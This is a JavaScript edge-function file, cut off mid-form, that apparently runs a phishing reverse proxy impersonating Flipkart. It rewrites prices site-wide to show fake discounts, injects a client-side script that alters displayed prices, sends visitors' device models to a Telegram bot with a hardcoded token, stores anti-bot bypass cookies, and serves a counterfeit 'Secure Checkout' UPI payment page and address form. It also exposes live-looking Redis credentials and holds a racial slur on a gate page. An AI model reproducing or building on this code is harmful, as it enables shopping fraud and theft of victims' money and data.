export const config = {
  runtime: 'edge',
};

// ── Vercel Edge Runtime HTMLRewriter Polyfill ───────────────────
if (typeof globalThis.HTMLRewriter === 'undefined') {
  globalThis.HTMLRewriter = class HTMLRewriter {
    constructor() {
      this.selectors = [];
    }
    on(selector, handler) {
      this.selectors.push({ selector, handler });
      return this;
    }
    async transform(response) {
      if (!response || !response.body) return response;
      let text = await response.text();

      for (const { selector, handler } of this.selectors) {
        if (selector === 'head' && handler && handler.element) {
          let prepends = '';
          let appends = '';
          handler.element({
            prepend(content) { prepends += content; },
            append(content) { appends += content; }
          });
          if (prepends && text.includes('<head>')) {
            text = text.replace('<head>', '<head>' + prepends);
          }
          if (appends && text.includes('</head>')) {
            text = text.replace('</head>', appends + '</head>');
          }
        }
      }

      for (const { selector, handler } of this.selectors) {
        if (selector.startsWith('[') && selector.endsWith(']') && handler && handler.element) {
          const attr = selector.slice(1, -1);
          const regex = new RegExp(`\\b${attr}=(["'])(.*?)\\1`, 'gi');
          text = text.replace(regex, (match, quote, val) => {
            let newVal = val;
            handler.element({
              getAttribute(a) { return a === attr ? val : null; },
              setAttribute(a, v) { if (a === attr) newVal = v; }
            });
            return `${attr}=${quote}${newVal}${quote}`;
          });
        }
      }

      const textHandlers = this.selectors.filter(s => s.handler && s.handler.text && s.selector !== 'head' && !s.selector.startsWith('['));
      if (textHandlers.length > 0) {
        text = text.replace(/(>)([^<]*₹[^<]*)(<)/g, (match, open, content, close) => {
          let modifiedContent = content;
          for (const { handler } of textHandlers) {
            handler.text({
              text: modifiedContent,
              replace(newTxt) { modifiedContent = newTxt; }
            });
          }
          return open + modifiedContent + close;
        });
      }

      const cleanHeaders = new Headers(response.headers);
      cleanHeaders.delete('content-encoding');
      cleanHeaders.delete('content-length');
      cleanHeaders.delete('transfer-encoding');

      return new Response(text, {
        status: response.status,
        statusText: response.statusText,
        headers: cleanHeaders
      });
    }
  };
}

// Flipkart Reverse Proxy — Cloudflare Worker v9
// Based on: oldworker.js stable routing + Session 8 pricing (help.txt)
// Fixes: fetch Request object bug, catch-all ₹ server-side, hydration interceptors

const TG_TOKEN = "8646739925:AAEB4vFZjfGm7nLghRqjkEb88aKtr5aIqvg";
const TG_CHAT = "8664945781";
const TG_API = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;

const BASE_UA =
  "Mozilla/5.0 (Linux; Android 16; RMX3853 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/148.0.7778.215 Mobile Safari/537.36";
const MOBILE_UA = BASE_UA + " FKUA/msite/0.0.3/msite/Mobile";
const DESKTOP_UA =
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

const API_DOMAINS = /^(?:[a-z0-9.-]+\.)?flipkart\.com$/i;
const CDN_DOMAINS =
  /^(static-assets-web|rukminim\d*|img\d*a?|assetscdn|fk-p-linchpin-web|fk-cp-zion|fk-p-zion|dlcdn|dl-web)\.flixcart\.com$/;
const STATIC_EXT =
  /\.(png|jpg|jpeg|gif|webp|svg|woff2?|ttf|eot|ico|mp4|webm|css|js|map)$/i;
const MOCK_DOMAINS = /^(\d*\.?sonic\.fdp\.api|sspa|events)\.flipkart\.com$/;

let _bypassCache = "";
let _bypassCacheAt = 0;
const BYPASS_TTL_MS = 5 * 60 * 1000;
const ALLOWED_BYPASS_COOKIE_RE =
  /^(cf_clearance|ak_bmsc|bm_sz|_abck|_pxhd|_px\d?|__fbp|_gcl_au)$/i;

// ── Telegram ──────────────────────────────────────────────────
async function tg(text, targetChat = TG_CHAT) {
  try {
    await fetch(TG_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: targetChat,
        text: String(text).slice(0, 4096),
        parse_mode: "HTML",
      }),
    });
  } catch (_) { }
}



// ── Upstash Redis Helpers (REST API) ──────────────────────────
const REDIS_URL = "https://bursting-anchovy-154415.upstash.io";
const REDIS_TOKEN = "gQAAAAAAAlsvAAIgcDFiZjE0OWRkNmMyYWU0ZjdhOWMyYTQ1NTVhNDVlMDc2OA";

async function getRedis(key) {
  try {
    const res = await fetch(`${REDIS_URL}/get/${key}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    if (!res.ok) return null;
    const data = await res.json();
    return data.result; // Upstash REST JSON format returns actual value in .result
  } catch (e) {
    return null;
  }
}

async function setRedis(key, value) {
  try {
    await fetch(`${REDIS_URL}/set/${key}/${encodeURIComponent(value)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
  } catch (e) { }
}

async function deleteRedis(key) {
  try {
    await fetch(`${REDIS_URL}/del/${key}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
  } catch (e) { }
}

// ── Refactored KV helpers using Redis ──────────────────────────
let _discountCache = -1;
let _discountCacheAt = 0;
const DISCOUNT_TTL_MS = 10 * 1000; // Cache discount for 10 seconds

async function getDiscount() {
  const now = Date.now();
  if (_discountCache !== -1 && now - _discountCacheAt < DISCOUNT_TTL_MS) {
    return _discountCache;
  }
  try {
    const val = await getRedis("discount");
    const n = parseFloat(val);
    const finalPct = !isNaN(n) && n >= 5 && n <= 99 ? n : 0;
    _discountCache = finalPct;
    _discountCacheAt = now;
    return finalPct;
  } catch (_) {
    return 0;
  }
}

async function setDiscount(pct) {
  try {
    if (!pct || pct <= 0) {
      await deleteRedis("discount");
      _discountCache = 0;
    } else {
      await setRedis("discount", String(pct));
      _discountCache = pct;
    }
    _discountCacheAt = Date.now();
  } catch (_) { }
}

// ── Indian number formatter: 56900 → "56,900" ─────────────────
function fmtIndian(n) {
  if (n <= 999) return String(n);
  const s = String(n);
  const last3 = s.slice(-3);
  let rest = s.slice(0, -3);
  const parts = [];
  while (rest.length > 2) {
    parts.unshift(rest.slice(-2));
    rest = rest.slice(0, -2);
  }
  if (rest) parts.unshift(rest);
  return parts.join(",") + "," + last3;
}

// ── Mobile Device Model Parsing & Visitor Notification ─────────
function parseModelFromRequest(request) {
  let chModel = request.headers.get("sec-ch-ua-model");
  if (chModel) {
    return chModel.replace(/"/g, "").trim();
  }
  const ua = request.headers.get("user-agent") || "";
  if (!ua) return "Unknown";
  if (ua.includes("iPhone")) return "iPhone";
  if (ua.includes("iPad")) return "iPad";
  if (ua.includes("iPod")) return "iPod";

  const androidMatch = ua.match(/Android\s+\d+;\s+([^;)]+)/);
  if (androidMatch) {
    let model = androidMatch[1].trim();
    if (model.includes("Build/")) {
      model = model.split("Build/")[0].trim();
    }
    if (model === "K" || model === "k") {
      return "Android Device";
    }
    return model;
  }
  return "Other/Desktop";
}

async function handleNewVisitor(modelNum) {
  try {
    const rawList = await getRedis("devices_list");
    let devices = [];
    if (rawList) {
      devices = JSON.parse(rawList);
    }
    if (!devices.includes(modelNum)) {
      devices.push(modelNum);
      await setRedis("devices_list", JSON.stringify(devices));

      const listenState = await getRedis("listen_state") || "on";
      if (listenState === "on") {
        await tg(`📱 <b>New User Visited</b>\nModel Number: <code>${modelNum}</code>`);
      }
    }
  } catch (e) { }
}

// ── Server-side JSON discount ─────────────────────────────────
// Layer 1: Called on EVERY JSON API response before React sees it
function applyDiscountToJson(jsonStr, pct) {
  if (!pct || pct <= 0) return jsonStr;
  // Skip very large responses to avoid Worker CPU timeout
  if (jsonStr.length > 2500000) {
    // Use regex fallback for large responses (much cheaper)
    return applyDiscountToRegexFallback(jsonStr, pct);
  }
  try {
    const obj = JSON.parse(jsonStr);
    discObjServer(obj, pct, false, false, false, 0);
    return JSON.stringify(obj);
  } catch (e) {
    return applyDiscountToRegexFallback(jsonStr, pct);
  }
}


function isServerMrpKey(k) {
  if (!k) return false;
  const lk = k.toLowerCase();
  const mrpKeys = {
    mrp: 1,
    maxretailprice: 1,
    strikethroughprice: 1,
    strikeprice: 1,
    strikeoffprice: 1,
    strikeoff: 1,
    mrpvalue: 1,
    totalmrp: 1,
    originalprice: 1,
    wasprice: 1,
    listprice: 1,
    retailprice: 1,
  };
  if (mrpKeys[lk]) return true;
  if (lk.includes("mrp")) return true;
  if (lk.includes("strike")) return true;
  if (
    lk.includes("originalprice") ||
    lk.includes("wasprice") ||
    lk.includes("listprice") ||
    lk.includes("retailprice")
  ) {
    return true;
  }
  if (lk.includes("beforediscount") || lk.includes("prediscount")) return true;
  return false;
}

function isMrpString(s) {
  if (!s || typeof s !== "string") return false;
  const ls = s.toLowerCase().trim();
  return (
    ls === "mrp" ||
    ls === "m.r.p." ||
    ls === "strikeoff" ||
    ls === "strikeoffprice"
  );
}

function isMrpKeyVal(k, val) {
  if (!k) return false;
  const lk = k.toLowerCase();
  if (
    lk.includes("strike") ||
    lk.includes("mrp") ||
    lk.includes("original") ||
    lk.includes("was")
  ) {
    if (val === true || String(val).toLowerCase() === "true") {
      return true;
    }
  }
  return false;
}

function isServerDiscountPercentageKey(k) {
  if (!k) return false;
  const lk = k.toLowerCase();
  return lk.includes("discount") || lk.includes("off") || lk.includes("savings");
}

function isServerPriceKey(k) {
  if (!k) return false;
  const lk = k.toLowerCase();
  const serverPK = {
    finalprice: 1,
    mrp: 1,
    sellingprice: 1,
    basesellingprice: 1,
    primaryproductprice: 1,
    totalprice: 1,
    discountedprice: 1,
    effectiveprice: 1,
    listingprice: 1,
    price: 1,
    strikethroughprice: 1,
    offerprice: 1,
    saleprice: 1,
    baseprice: 1,
    maxretailprice: 1,
    retailprice: 1,
    sp: 1,
    fp: 1,
    unitprice: 1,
    specialprice: 1,
    totalamount: 1,
    carttotal: 1,
    ordertotal: 1,
    payableamount: 1,
    grandtotal: 1,
    subtotal: 1,
    itemtotal: 1,
    netprice: 1,
    strikeprice: 1,
    ourprice: 1,
    bestprice: 1,
    lowestprice: 1,
    coinvalue: 1,
    feelabelprice: 1,
    strikeoffprice: 1,
    strikeoff: 1,
    originalprice: 1,
    listprice: 1,
    wasprice: 1,
    mrpvalue: 1,
    displayprice: 1,
    totalmrp: 1,
    totalsavings: 1,
    totalsellingprice: 1,
    totalcharge: 1,
    totalcharges: 1,
    totalpayable: 1,
    checkouttotal: 1,
    baskettotal: 1,
    orderamount: 1,
    cartamount: 1,
    totalsp: 1,
    totalfinalprice: 1,
    codcharges: 1,
    deliverycharge: 1,
    offersavings: 1,
    totaldiscount: 1,
    bagtotal: 1,
    checkoutamount: 1,
    paymentamount: 1,
    billamount: 1,
  };
  return (
    !!serverPK[lk] ||
    lk.includes("price") ||
    lk.includes("mrp") ||
    lk.includes("strike") ||
    lk.includes("amount") ||
    lk.includes("payable") ||
    lk.includes("saving") ||
    lk.includes("charge") ||
    lk.includes("fee") ||
    lk.includes("tax")
  );
}

function discObjServer(o, pct, pp, isMrpContext, isDiscountContext, _depth) {
  if (!o || typeof o !== "object") return;
  if (o.__sd) return;
  const depth = _depth || 0;
  if (depth > 25) return;
  try {
    Object.defineProperty(o, "__sd", { value: true, writable: true, enumerable: false, configurable: true });
  } catch (_) {
    o.__sd = true;
  }
  const mult = (100 - pct) / 100;
  const inr =
    o.currency === "INR" ||
    o.currencySymbol === "₹" ||
    o.currencySymbol === "\u20b9";
  const sd = true;

  let objectIsMrp = isMrpContext;
  let objectIsDiscount = isDiscountContext;
  if (!Array.isArray(o)) {
    for (const k in o) {
      if (Object.prototype.hasOwnProperty.call(o, k)) {
        const val = o[k];
        if (isMrpKeyVal(k, val)) {
          objectIsMrp = true;
        }
        if (typeof val === "string") {
          if (isMrpString(val)) {
            objectIsMrp = true;
          }
          const lval = val.toLowerCase();
          if (lval === "percentage" || lval.includes("discount")) {
            objectIsDiscount = true;
          }
        } else if (val && typeof val === "object" && !Array.isArray(val)) {
          // Depth-2 scan
          for (const k2 in val) {
            if (Object.prototype.hasOwnProperty.call(val, k2)) {
              const val2 = val[k2];
              if (isMrpKeyVal(k2, val2)) {
                objectIsMrp = true;
              }
              if (typeof val2 === "string") {
                if (isMrpString(val2)) {
                  objectIsMrp = true;
                }
              }
            }
          }
        }
      }
    }
  }

  for (const k in o) {
    if (!Object.prototype.hasOwnProperty.call(o, k)) continue;
    const v = o[k];
    const isExplicitSellingKey = isServerPriceKey(k) && !isServerMrpKey(k);
    const currentIsMrp = isExplicitSellingKey ? false : (objectIsMrp || isServerMrpKey(k));
    const currentIsDiscount = objectIsDiscount || isServerDiscountPercentageKey(k);



    if (v && typeof v === "object") {
      discObjServer(v, pct, sd || isServerPriceKey(k), currentIsMrp, currentIsDiscount, depth + 1);
    } else if (typeof v === "number") {
      if ((currentIsDiscount || isServerDiscountPercentageKey(k)) && v < 100) {
        o[k] = pct;
      } else if (isServerPriceKey(k) && !currentIsMrp && v >= 500) {
        o[k] = Math.round(v * mult);
      } else if (
        sd &&
        !currentIsMrp &&
        (k === "value" || k === "valueInRupees" || k === "amount" || k === "num") &&
        v >= 500
      ) {
        o[k] = Math.round(v * mult);
      }
    } else if (typeof v === "string") {
      if (currentIsDiscount || isServerDiscountPercentageKey(k)) {
        if (v.includes("%")) {
          o[k] = v.replace(/\d+%/g, pct + "%");
        } else {
          const num = parseFloat(v);
          if (!isNaN(num) && num < 100) o[k] = String(pct);
        }
      } else if (v.indexOf("₹") !== -1 || v.indexOf("\u20b9") !== -1) {
        if (!isServerMrpKey(k) && !currentIsMrp) {
          o[k] = v.replace(/(?:₹|\u20b9)\s*([\d,]+)/g, (m, p) => {
            const n = parseInt(p.replace(/,/g, ""), 10);
            if (isNaN(n) || n < 500) return m;
            return (
              (m.charAt(0) === "₹" ? "₹" : "\u20b9") +
              fmtIndian(Math.round(n * mult))
            );
          });
        }
      } else if (isServerPriceKey(k) && !currentIsMrp) {
        const num = parseFloat(v.replace(/,/g, ""));
        if (!isNaN(num) && num >= 500) o[k] = (num * mult).toFixed(2);
      } else if (
        sd &&
        !currentIsMrp &&
        (k === "decimalValue" ||
          k === "value" ||
          k === "valueInRupees" ||
          k === "amount" ||
          k === "text" ||
          k === "displayValue" ||
          k === "formattedValue" ||
          k === "displayPrice" ||
          k === "label" ||
          k === "title" ||
          k === "subText" ||
          k === "header")
      ) {
        const num = parseFloat(v.replace(/,/g, ""));
        if (!isNaN(num) && num >= 500) {
          o[k] = v.includes(",")
            ? fmtIndian(Math.round(num * mult))
            : (num * mult).toFixed(2);
        }
      }
    }
  }
}

function applyDiscountToRegexFallback(jsonStr, pct) {
  const mult = (100 - pct) / 100;
  let out = jsonStr;
  out = out.replace(/(?:₹|\\u20b9)([\d,]{2,})/g, (m, p) => {
    const num = parseInt(p.replace(/,/g, ""), 10);
    if (isNaN(num) || num < 500) return m;
    return (
      (m.charAt(0) === "₹" ? "₹" : "\\u20b9") +
      fmtIndian(Math.round(num * mult))
    );
  });
  const priceKeyRegex = /"([^"]*(?:price|selling|sp|final|offer|special|amount|value)[^"]*)"\s*:\s*(\d{3,7})/gi;
  out = out.replace(priceKeyRegex, (m, key, valStr) => {
    const lk = key.toLowerCase();
    if (lk.includes("mrp") || lk.includes("strike") || lk.includes("max") || lk.includes("original") || lk.includes("count") || lk.includes("id")) return m;
    const num = parseInt(valStr, 10);
    if (isNaN(num) || num < 500) return m;
    return `"${key}":${Math.round(num * mult)}`;
  });
  return out;
}

// ── DOM price rewriter script (client-side safety net) ────────
function buildDomPriceScript(pct) {
  if (!pct || pct <= 0) return "";
  return `<script>
(function(){
var PCT=${pct};
var MULT=(100-PCT)/100;
function fi(n){
  if(n<=999)return String(n);
  var s=String(n),l=s.slice(-3),r=s.slice(0,-3),p=[];
  while(r.length>2){p.unshift(r.slice(-2));r=r.slice(0,-2);}
  if(r)p.unshift(r);
  return p.join(',')+','+l;
}
var DOM_THRESH=Math.max(500,Math.round(500/MULT));
function isStrikethroughEl(el) {
  var node = el;
  var depth = 0;
  while (node && node !== document.body && depth < 4) {
    var tag = (node.tagName || '').toUpperCase();
    if (tag === 'DEL' || tag === 'S' || tag === 'STRIKE') return true;
    if (tag === 'BUTTON' || tag === 'A' || tag === 'INPUT' || tag === 'OPTION') return true;
    if (node.getAttribute && node.getAttribute('role') === 'button') return true;
    var cl = (node.className || '');
    if (typeof cl === 'string') {
      var lcl = cl.toLowerCase();
      if (lcl.indexOf('strike') !== -1 || 
          lcl.indexOf('line-through') !== -1 || 
          lcl.indexOf('_3i9_r9') !== -1 || 
          lcl.indexOf('btn') !== -1 ||
          lcl.indexOf('button') !== -1 ||
          lcl.indexOf('buy') !== -1 ||
          lcl.indexOf('checkout') !== -1 ||
          lcl.indexOf('action') !== -1 ||
          lcl.indexOf('cart') !== -1 ||
          lcl.indexOf('pay') !== -1 ||
          lcl.indexOf('_2kpz6l') !== -1 ||
          lcl.indexOf('_3a16wa') !== -1) {
        return true;
      }
    }
    var idAndTestId = (node.id || '') + ' ' + (node.getAttribute ? (node.getAttribute('data-testid') || '') : '');
    var lIdTest = idAndTestId.toLowerCase();
    if (lIdTest.indexOf('buy') !== -1 || 
        lIdTest.indexOf('checkout') !== -1 || 
        lIdTest.indexOf('cart') !== -1 || 
        lIdTest.indexOf('button') !== -1 || 
        lIdTest.indexOf('btn') !== -1) {
      return true;
    }
    var style = node.getAttribute ? (node.getAttribute('style') || '') : '';
    if (style.indexOf('line-through') !== -1) return true;
    node = node.parentNode;
    depth++;
  }
  return false;
}
function fixNode(node){
  if(node.nodeType===3){
    var t=node.textContent;
    if(t.indexOf('\u20b9')!==-1){
      if(!isStrikethroughEl(node.parentNode)){
        var nt=t.replace(/\u20b9\\s*([\\d,]+)/g,function(m,ns){
          var n=parseInt(ns.replace(/,/g,''),10);
          if(isNaN(n)||n<DOM_THRESH)return m;
          return '\u20b9'+fi(Math.round(n*MULT));
        });
        if(nt!==t)node.textContent=nt;
      }
    } else if(t.indexOf('%')!==-1){
      var trimmed = t.trim();
      if(trimmed.length <= 12 && /\\d+%/g.test(trimmed)){
        var nt=t.replace(/\\d+%/g, PCT+'%');
        if(nt!==t)node.textContent=nt;
      }
    }
  }else if(node.nodeType===1){
    var tag=node.tagName;
    if(tag==='SCRIPT'||tag==='STYLE'||tag==='NOSCRIPT'||tag==='TEXTAREA')return;
    for(var i=0;i<node.childNodes.length;i++)fixNode(node.childNodes[i]);
  }
}
function fixSubtree(el){
  try{fixNode(el);}catch(e){}
}
function start(){
  fixSubtree(document.body);
  // Only observe NEW nodes being added - don't observe characterData
  // This prevents the React vs MutationObserver infinite loop
  var obs=new MutationObserver(function(mutations){
    for(var i=0;i<mutations.length;i++){
      var added=mutations[i].addedNodes;
      if(added&&added.length){
        for(var j=0;j<added.length;j++){
          if(added[j].nodeType===1||added[j].nodeType===3){
            fixSubtree(added[j]);
          }
        }
      }
    }
  });
  obs.observe(document.body,{childList:true,subtree:true});
}
if(document.body){start();}else{document.addEventListener('DOMContentLoaded',start);}
window.addEventListener('pageshow',function(e){
  if(e.persisted){window.location.replace(window.location.protocol+'//'+window.location.host+'/');}
});
})();
<\/script>`;
}

// ── Cookie jar ────────────────────────────────────────────────
// IMPORTANT: NO shared cookieJar. Each request creates its own reqJar
// (Map) in the fetch handler. Module-level bypassJar holds ONLY
// non-session bypass cookies — never user session/login cookies.
// This prevents Account A's session leaking to User B.
const bypassJar = new Map(); // module-level: bypass cookies only

function parseCookies(list, jar) {
  for (const h of list) {
    const part = h.split(";")[0].trim();
    const eq = part.indexOf("=");
    if (eq > 0) jar.set(part.slice(0, eq).trim(), part.slice(eq + 1).trim());
  }
}

function buildCookieHeader(incoming, jar) {
  const stored = [...jar.entries()].map(([k, v]) => `${k}=${v}`).join("; ");
  if (!incoming) return stored;
  if (!stored) return incoming;
  const m = new Map();
  for (const p of incoming.split(";")) {
    const e = p.indexOf("=");
    if (e > 0) m.set(p.slice(0, e).trim(), p.slice(e + 1).trim());
  }
  for (const [k, v] of jar) m.set(k, v);
  return [...m.entries()].map(([k, v]) => `${k}=${v}`).join("; ");
}

function _applyBypassString(str) {
  // Writes ONLY to bypassJar (module-level), never to per-request jar
  for (const part of str.split(";")) {
    const eq = part.indexOf("=");
    if (eq <= 0) continue;
    const k = part.slice(0, eq).trim();
    const v = part.slice(eq + 1).trim();
    if (k && v) bypassJar.set(k, v);
  }
}

async function loadBypassCookies() {
  const now = Date.now();
  if (_bypassCache && now - _bypassCacheAt < BYPASS_TTL_MS) {
    _applyBypassString(_bypassCache);
    return;
  }
  try {
    const saved = await getRedis("bypass_cookies");
    _bypassCache = saved || "";
    _bypassCacheAt = now;
    if (saved) _applyBypassString(saved);
  } catch (_) { }
}

// jar = per-request Map — only safe (non-session) cookies saved to Redis
async function saveBypassCookies(jar) {
  if (!jar || jar.size === 0) return;
  try {
    const safe = [...jar.entries()]
      .filter(([k]) => ALLOWED_BYPASS_COOKIE_RE.test(k))
      .map(([k, v]) => `${k}=${v}`)
      .join("; ");
    if (safe) {
      _applyBypassString(safe); // update module-level bypassJar too
      _bypassCache = safe;
      _bypassCacheAt = Date.now();
      await setRedis("bypass_cookies", safe);
    }
  } catch (_) { }
}

function servePaymentGatewayPage(request, origin) {
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>Payment - Secure Checkout</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1,user-scalable=no" />
    <link rel="icon" href="https://static-assets-web.flixcart.com/www/promos/new/20150528-140547-favicon-retina.ico" type="image/png" />

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />

    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v7.0.0/css/fontawesome.css" />
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v7.0.0/css/thin.css" />
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v7.0.0/css/solid.css" />
    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v7.0.0/css/regular.css" />

    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: #f3f4f6;
            max-width: 480px;
            margin: 0 auto;
            color: #111;
        }

        header {
            position: sticky;
            top: 0;
            background: #fff;
            z-index: 30;
            padding: 12px;
            border-bottom: 1px solid #e5e7eb;
        }

        .total-card {
            background: #eff6ff;
            border-radius: 8px;
            padding: 12px;
            margin-top: 8px;
        }

        #upi-panel {
            max-height: 0;
            overflow: hidden;
            transition: all 0.3s ease-in-out;
            opacity: 0;
            background: #f3f4f6;
            margin-top: 0;
        }

        #upi-panel.open {
            max-height: 400px;
            opacity: 1;
            padding: 8px 0;
        }

        .form-check {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 8px 12px;
            border-radius: 6px;
            margin-bottom: 4px;
            cursor: pointer;
            background: #fff;
        }

        .form-check.active {
            background: #f0f9ff;
            border: 1px solid #bae6fd;
        }

        .not-available {
            opacity: 0.4;
            pointer-events: none;
        }

        .payment-row {
            display: flex;
            gap: 12px;
            padding: 12px 16px;
            background: #fff;
            align-items: flex-start;
            cursor: pointer;
            border-bottom: 1px solid #f3f4f6;
        }

        .modal {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 400px;
            background: white;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            padding: 7px;
            border-radius: 8px;
            z-index: 1000;
        }

        .modal.show { display: block; }

        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 999;
        }

        .modal-overlay.show { display: block; }

        .close-btn {
            display: block;
            padding: 8px 16px;
            background: #FFC107;
            color: black;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
            text-align: center;
        }

        .selling_price {
            color: #1D4ED8;
            font-weight: 700;
            font-size: 16px;
        }

        .qr-skeleton {
            width: 230px; height: 230px;
            border-radius: 18px;
            background: linear-gradient(110deg, #ececec 8%, #f5f5f5 18%, #ececec 33%);
            background-size: 200% 100%;
            animation: skeletonMove 1.2s linear infinite;
        }

        .qr-skeleton-line {
            width: 140px; height: 12px;
            border-radius: 8px;
            background: linear-gradient(110deg, #ececec 8%, #f5f5f5 18%, #ececec 33%);
            background-size: 200% 100%;
            animation: skeletonMove 1.2s linear infinite;
        }

        @keyframes skeletonMove { to { background-position: -200% 0; } }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes scaleIn { from { opacity: 0; transform: scale(0.92); } to { opacity: 1; transform: scale(1); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes colorSpin {
            0%   { transform: rotate(0deg);   border-top-color: #2874f0; }
            25%  { transform: rotate(90deg);  border-top-color: #ff6b6b; }
            50%  { transform: rotate(180deg); border-top-color: #51cf66; }
            75%  { transform: rotate(270deg);  border-top-color: #ffd43b; }
            100% { transform: rotate(360deg); border-top-color: #2874f0; }
        }

        #qr-code { opacity: 0; transform: scale(.96); transition: .25s ease; }
        #qr-code.ready { opacity: 1; transform: scale(1); }

        .good-try-page {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
            padding: 24px;
        }

        .good-try-page h1 {
            font-size: 28px;
            font-weight: 800;
            color: #111;
            margin-bottom: 12px;
        }

        .good-try-page .emoji {
            font-size: 64px;
            margin-bottom: 16px;
        }

        .color-spinner {
            width: 64px;
            height: 64px;
            border-radius: 50%;
            border: 5px solid #e5e7eb;
            border-top: 5px solid #2874f0;
            margin: 0 auto 20px;
            animation: colorSpin 2s linear infinite;
        }

        .timer-text {
            font-size: 42px;
            font-weight: 700;
            color: #2874f0;
            font-variant-numeric: tabular-nums;
        }

        .progress-bar {
            width: 100%;
            height: 6px;
            background: #e5e7eb;
            border-radius: 3px;
            overflow: hidden;
            margin: 16px 0;
        }

        .progress-fill {
            height: 100%;
            background: #2874f0;
            border-radius: 3px;
            transition: width 1s linear;
        }

        /* ADDRESS PAGE STYLES */
        .address-page {
            background: #fff;
            min-height: 100vh;
        }

        .address-header {
            display: flex;
            align-items: center;
            padding: 12px 16px;
            border-bottom: 1px solid #e5e7eb;
            background: #fff;
            position: sticky;
            top: 0;
            z-index: 10;
        }

        .address-header h4 {
            margin: 0;
            font-size: 16px;
            font-weight: 600;
        }

        .progress-step {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 12px 16px;
            background: #fff;
            border-bottom: 1px solid #e5e7eb;
        }

        .step-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
        }

        .step-circle {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: #2874f0;
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 600;
        }

        .step-circle.inactive {
            background: #fff;
            border: 2px solid #e5e7eb;
            color: #999;
        }

        .step-label {
            font-size: 10px;
            color: #666;
        }

        .step-line {
            width: 40px;
            height: 2px;
            background: #e5e7eb;
        }

        .form-floating {
            margin-bottom: 16px;
            position: relative;
        }

        .form-floating input, .form-floating select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            outline: none;
            box-sizing: border-box;
        }

        .form-floating label {
            position: absolute;
            left: 12px;
            top: 12px;
            color: #999;
            font-size: 14px;
            transition: 0.2s;
            pointer-events: none;
            background: #fff;
            padding: 0 4px;
        }

        .form-floating input:focus + label,
        .form-floating input:not(:placeholder-shown) + label,
        .form-floating select:focus + label,
        .form-floating select:not([value=""]) + label {
            top: -8px;
            font-size: 11px;
            color: #2874f0;
        }

        .form-row {
            display: flex;
            gap: 12px;
        }

        .form-row .form-floating {
            flex: 1;
        }

        .save-address-btn {
            width: 90%;
            margin: 20px auto;
            padding: 14px;
            background: #ff6b00;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: block;
            text-align: center;
        }

        .save-address-btn:hover {
            background: #e55e00;
        }

        .shipping-banner {
            margin: 12px 16px;
            border-radius: 8px;
            overflow: hidden;
        }

        .shipping-banner img {
            width: 100%;
            border-radius: 8px;
        }
    </style>
</head>

<body>
    <!-- GOOD TRY NIGGA BLOCK PAGE -->
    <div id="block-page" style="display:none;">
        <div class="good-try-page">
            <div class="emoji">&#128514;</div>
            <h1>GOOD TRY NIGGA</h1>
            <p style="font-size:15px; color:#666;">You need a valid payment link to access this page.</p>
        </div>
    </div>

    <!-- ADDRESS PAGE -->
    <div id="address-page" style="display:none;">
        <div class="address-page">
            <div class="address-header">
                <div style="margin-right: 12px; cursor: pointer;" id="back-btn">
                    <svg width="19" height="16" viewBox="0 0 19 16" xmlns="http://www.w3.org/2000/svg">
                        <path d="M17.556 7.847H1M7.45 1L1 7.877l6.45 6.817" stroke="#000" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
                    </svg>
                </div>
                <h4>Add delivery address</h4>
            </div>

            <div class="progress-step">
                <div class="step-item">
                    <div class="step-circle">1</div>
                    <span class="step-label">Address</span>
                </div>
                <div class="step-line"></div>
                <div class="step-item">
                    <div class="step-circle inactive">2</div>
                    <span class="step-label">Order Summary</span>
                </div>
                <div class="step-line"></div>
                <div class="step-item">
                    <div class="step-circle inactive">3</div>
                    <span class="step-label">Payment</span>
                </div>
            </div>

            <div style="padding: 16px;">
                <form id="addressForm">
                    <div class="form-floating">
                        <input type="text" id="name" placeholder=" " />
                        <label>Full Name (Required)*</label>
                    </div>
                    <div class="form-floating">
